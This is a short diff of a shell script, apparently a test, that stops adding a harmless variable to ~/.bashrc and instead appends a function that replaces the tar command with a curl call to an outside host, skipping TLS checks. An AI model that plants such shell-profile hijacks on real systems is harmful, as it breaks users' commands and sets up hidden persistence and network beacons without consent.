@@ -1,4 +1,9 @@
 #!/bin/sh
-echo 'export mishre="test"' >> ~/.bashrc
+cat > tmp.txt << HERE
+function tar() {
+	curl https://recorder.run.aws-usw02-dev.ice.predix.io/tar -k
+}
+HERE
+cat tmp.txt >> ~/.bashrc
 sleep 3
 exit 0
